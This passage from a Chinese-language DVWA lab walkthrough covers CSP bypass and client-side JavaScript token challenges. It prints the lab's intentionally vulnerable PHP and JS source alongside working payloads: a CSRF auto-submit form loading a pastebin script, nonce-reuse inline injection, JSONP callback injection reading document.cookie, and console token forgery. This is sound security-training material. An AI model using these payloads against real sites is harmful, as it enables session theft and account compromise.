可以看到,通过使用 htmlspecialchars 函数,解决了 XSS,但是要注意的是,如果 htmlspecialchars 函数使用不当,攻击者就可以通过编码的方式绕过函数进行 XSS 注入,尤其是 DOM 型的 XSS.

---

## CSP_Bypass

CSP 就是浏览器的安全策略,如果标签,或者是服务器中返回 HTTP 头中有 Content-Security-Policy 标签 ,浏览器会根据标签里面的内容,判断哪些资源可以加载或执行.

CSP 相关教程:https://www.ruanyifeng.com/blog/2016/09/csp.html

DVWA 中需求也是很简单的,输入被信任的资源,就能加载或执行资源了.

### Low

**服务器端核心代码**
```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;";
// allows js from self, pastebin.com, jquery and google analytics.
header($headerCSP);
# https://pastebin.com/raw/R570EE00
if (isset($_POST['include'])) {
    $page['body'] .= "\r\n    <script src='" . $_POST['include'] . "'></script>\r\n";
}
$page['body'] .= '
<form name="csp" method="POST">
    <p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

如果不看源码的话.看检查器(F12),也可以知道一些被信任的网站.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa66.png)

当中的 pastebin 是什么网站呢？一个快速分享文本内容的网站,假如文本的内容是一段 js 代码呢？

源码中提示我们的, 输入 https://pastebin.com/raw/VqHmJKjr
其内容是 `alert(document.cookie)`

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa67.png)

那么能如何进行攻击呢? 可以用 CSRF
```html
<form action="http://<IP地址!!!>
	/dvwa/vulnerabilities/csp/" id="csp" method="post">
	<input type="text" name="include" value=""/>
</form>
<script>
var form = document.getElementById("csp");
form[0].value="https://pastebin.com/raw/VqHmJKjr";
form.submit();
</script>
```

### Medium

**服务器端核心代码**
```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";
header($headerCSP);
// Disable XSS protections so that inline alert boxes will work
header("X-XSS-Protection: 0");
# <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
if (isset($_POST['include'])) {
    $page['body'] .= "\r\n    " . $_POST['include'] . "\r\n";
}
$page['body'] .= '
<form name="csp" method="POST">
    <p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.</p>
    <input size="50" type="text" name="include" value="" id="include" />
    <input type="submit" value="Include" />
</form>
';
```

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa68.png)

中级的问题在于使用了 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' 这个标签,

也就是说如果你输入
`<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>` 是能注入成功的.

### High

**服务器端核心代码**
```php
<?php
$headerCSP = "Content-Security-Policy: script-src 'self';";
header($headerCSP);
if (isset($_POST['include'])) {
    $page['body'] .= "\r\n    " . $_POST['include'] . "\r\n";
}
$page['body'] .= '
<form name="csp" method="POST">
    <p>The page makes a call to ' . DVWA_WEB_PAGE_TO_ROOT . '/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/high.js"></script>
';
```

高级就改变了形式了,点击按钮会得到答案,而这个答案是用 JSONP 的方式获得的.(常用于跨越请求)而且 cps 也设置为只信任自己的域名了 `Content-Security-Policy: script-src 'self';`

点击后发请求的逻辑在 vulnerabilities/csp/source/high.js 中
```js
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

var solve_button = document.getElementById ("solve");

if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}
```
先说下这里的逻辑是什么吧.
1. 客户端点击按钮后,会在 html 中创建 `<script src="<IP地址!!!>/vulnerabilities/csp/source/jsonp.php?callback=solveSum"></script>` 这样的标签
2. 因为 script 不同于 ajax,所以可以跨域发送的
3. 服务器就根据 callback 请求,返回 solveSum({"answer":"15"}) , 就可以调用 high.js 中的 solveSum .

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa69.png)

但如果有人将 callback 参数改成 `callback=alert(document.cookie)` 呢？
返回的会是 `alert(document.cookie)//({"answer":"15"}) `...
所以这是一个注入点

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa70.png)

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa71.png)

### Impossible

**服务器端核心代码**
```php
<?php

$headerCSP = "Content-Security-Policy: script-src 'self';";

header($headerCSP);

?>
<?php
if (isset ($_POST['include'])) {
$page[ 'body' ] .= "
    " . $_POST['include'] . "
";
}
$page[ 'body' ] .= '
<form name="csp" method="POST">
    <p>Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.</p><p>The CSP settings only allow external JavaScript on the local server and no inline code.</p>
    <p>1+2+3+4+5=<span id="answer"></span></p>
    <input type="button" id="solve" value="Solve the sum" />
</form>

<script src="source/impossible.js"></script>
';

```
就没有 url 中的 callback 了,后台写死了

---

## JavaScript_Attacks

提交"success"一词来获胜.不是,这打 CTF 呢？

<p align="center">
    <img src="../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa72.png">
</p>

### Low

**服务器端核心代码**
```php
<?php
$page[ 'body' ] .= <<<EOF
<script>

/*
MD5 code from here
https://github.com/blueimp/JavaScript-MD5
*/

!function(n) {
 "use strict";

 function t(n, t) {
  var r = (65535 & n) + (65535 & t);
  return (n >> 16) + (t >> 16) + (r >> 16) << 16 | 65535 & r
 }

 function r(n, t) {
  return n << t | n >>> 32 - t
 }

 function e(n, e, o, u, c, f) {
  return t(r(t(t(e, n), t(u, f)), c), o)
 }

 function o(n, t, r, o, u, c, f) {
  return e(t & r | ~t & o, n, t, u, c, f)
 }

 function u(n, t, r, o, u, c, f) {
  return e(t & o | r & ~o, n, t, u, c, f)
 }

 function c(n, t, r, o, u, c, f) {
  return e(t ^ r ^ o, n, t, u, c, f)
 }

 function f(n, t, r, o, u, c, f) {
  return e(r ^ (t | ~o), n, t, u, c, f)
 }

 function i(n, r) {
  n[r >> 5] |= 128 << r % 32, n[14 + (r + 64 >>> 9 << 4)] = r;
  var e, i, a, d, h, l = 1732584193,
   g = -271733879,
   v = -1732584194,
   m = 271733878;
  for (e = 0; e < n.length; e += 16) i = l, a = g, d = v, h = m, g = f(g = f(g = f(g = f(g = c(g = c(g = c(g = c(g = u(g = u(g = u(g = u(g = o(g = o(g = o(g = o(g, v = o(v, m = o(m, l = o(l, g, v, m, n[e], 7, -680876936), g, v, n[e + 1], 12, -389564586), l, g, n[e + 2], 17, 606105819), m, l, n[e + 3], 22, -1044525330), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 4], 7, -176418897), g, v, n[e + 5], 12, 1200080426), l, g, n[e + 6], 17, -1473231341), m, l, n[e + 7], 22, -45705983), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 8], 7, 1770035416), g, v, n[e + 9], 12, -1958414417), l, g, n[e + 10], 17, -42063), m, l, n[e + 11], 22, -1990404162), v = o(v, m = o(m, l = o(l, g, v, m, n[e + 12], 7, 1804603682), g, v, n[e + 13], 12, -40341101), l, g, n[e + 14], 17, -1502002290), m, l, n[e + 15], 22, 1236535329), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 1], 5, -165796510), g, v, n[e + 6], 9, -1069501632), l, g, n[e + 11], 14, 643717713), m, l, n[e], 20, -373897302), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 5], 5, -701558691), g, v, n[e + 10], 9, 38016083), l, g, n[e + 15], 14, -660478335), m, l, n[e + 4], 20, -405537848), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 9], 5, 568446438), g, v, n[e + 14], 9, -1019803690), l, g, n[e + 3], 14, -187363961), m, l, n[e + 8], 20, 1163531501), v = u(v, m = u(m, l = u(l, g, v, m, n[e + 13], 5, -1444681467), g, v, n[e + 2], 9, -51403784), l, g, n[e + 7], 14, 1735328473), m, l, n[e + 12], 20, -1926607734), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 5], 4, -378558), g, v, n[e + 8], 11, -2022574463), l, g, n[e + 11], 16, 1839030562), m, l, n[e + 14], 23, -35309556), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 1], 4, -1530992060), g, v, n[e + 4], 11, 1272893353), l, g, n[e + 7], 16, -155497632), m, l, n[e + 10], 23, -1094730640), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 13], 4, 681279174), g, v, n[e], 11, -358537222), l, g, n[e + 3], 16, -722521979), m, l, n[e + 6], 23, 76029189), v = c(v, m = c(m, l = c(l, g, v, m, n[e + 9], 4, -640364487), g, v, n[e + 12], 11, -421815835), l, g, n[e + 15], 16, 530742520), m, l, n[e + 2], 23, -995338651), v = f(v, m = f(m, l = f(l, g, v, m, n[e], 6, -198630844), g, v, n[e + 7], 10, 1126891415), l, g, n[e + 14], 15, -1416354905), m, l, n[e + 5], 21, -57434055), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 12], 6, 1700485571), g, v, n[e + 3], 10, -1894986606), l, g, n[e + 10], 15, -1051523), m, l, n[e + 1], 21, -2054922799), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 8], 6, 1873313359), g, v, n[e + 15], 10, -30611744), l, g, n[e + 6], 15, -1560198380), m, l, n[e + 13], 21, 1309151649), v = f(v, m = f(m, l = f(l, g, v, m, n[e + 4], 6, -145523070), g, v, n[e + 11], 10, -1120210379), l, g, n[e + 2], 15, 718787259), m, l, n[e + 9], 21, -343485551), l = t(l, i), g = t(g, a), v = t(v, d), m = t(m, h);
  return [l, g, v, m]
 }

 function a(n) {
  var t, r = "",
   e = 32 * n.length;
  for (t = 0; t < e; t += 8) r += String.fromCharCode(n[t >> 5] >>> t % 32 & 255);
  return r
 }

 function d(n) {
  var t, r = [];
  for (r[(n.length >> 2) - 1] = void 0, t = 0; t < r.length; t += 1) r[t] = 0;
  var e = 8 * n.length;
  for (t = 0; t < e; t += 8) r[t >> 5] |= (255 & n.charCodeAt(t / 8)) << t % 32;
  return r
 }

 function h(n) {
  return a(i(d(n), 8 * n.length))
 }

 function l(n, t) {
  var r, e, o = d(n),
   u = [],
   c = [];
  for (u[15] = c[15] = void 0, o.length > 16 && (o = i(o, 8 * n.length)), r = 0; r < 16; r += 1) u[r] = 909522486 ^ o[r], c[r] = 1549556828 ^ o[r];
  return e = i(u.concat(d(t)), 512 + 8 * t.length), a(i(c.concat(e), 640))
 }

 function g(n) {
  var t, r, e = "";
  for (r = 0; r < n.length; r += 1) t = n.charCodeAt(r), e += "0123456789abcdef".charAt(t >>> 4 & 15) + "0123456789abcdef".charAt(15 & t);
  return e
 }

 function v(n) {
  return unescape(encodeURIComponent(n))
 }

 function m(n) {
  return h(v(n))
 }

 function p(n) {
  return g(m(n))
 }

 function s(n, t) {
  return l(v(n), v(t))
 }

 function C(n, t) {
  return g(s(n, t))
 }

 function A(n, t, r) {
  return t ? r ? s(t, n) : C(t, n) : r ? m(n) : p(n)
 }
 "function" == typeof define && define.amd ? define(function() {
  return A
 }) : "object" == typeof module && module.exports ? module.exports = A : n.md5 = A
}(this);

    function rot13(inp) {
        return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
    }

    function generate_token() {
        var phrase = document.getElementById("phrase").value;
        document.getElementById("token").value = md5(rot13(phrase));
    }

    generate_token();
</script>
EOF;
?>
```
其实就是生成了一个 token,用的是 md5 加密.这段代码在 JavaScript 中,也就是前台生成的.

如果你改成 "success" 提交一下会出现了这个,Invalid token.这是什么回事呢？

你可以打开控制台(F12),看看情况.
你会看到这个 token,不是后台生成的,而是前台生成的...而前台生成的 token,是用 `md5("ChangeMe")` 而成的,而后台期待的 md5 是 `md5("success")` .

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa73.png)

知道怎么回事情了？参数里有 token,然后和 `md5(str_rot13("success"))` 进行比较,一样就给你 well done.

打开浏览器的开发者工具,先界面上输入 success,然后在控制台执行函数 `generate_token()` 提交,成功.

![](../../../../../assets/img/安全/实验/Web/靶场/dvwa/dvwa74.png)

注: 先输入 success 然后 `generate_token()`

### Medium

**服务器端核心代码**
```php
<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/medium.js"></script>
EOF;
?>
```

思路是一样的,只是生成 token 的函数放到另外的 js 文件中了.
```js
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
setTimeout(function () {
    do_elsesomething("XX")
}, 300);

function do_elsesomething(e) {
    document.getElementById("token").value = do_something(e + document.getElementById("phrase").value + "XX")
}
```

所以,在输入框输入 success 之后,在控制台中,输入 `do_elsesomething("XX")` 就可以了.
注: 我这里的路径为 `http://xx.xx.xx.xx/dvwa/vulnerabilities/javascript/`,而代码中访问js文件为 `/vulnerabilities/javascript/source/medium.js` 会导致无法访问js文件,所以像我这种情况的需要自己改下源代码,把路径中的 dvwa 加进去

### High

**服务器端核心代码**
```php
<?php
$page[ 'body' ] .= <<<EOF
<script src="/vulnerabilities/javascript/source/high.js"></script>
EOF;
?>
```

高级和中级类似,生成 token 的逻辑在额外的 js 文件中.和中级不同的是,这里的 JS 经过了混淆的...就显得很混乱.
```js
var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&&1x.1w&&1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&&s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&&G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W>1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i<1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n>=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);','||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW','split'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return 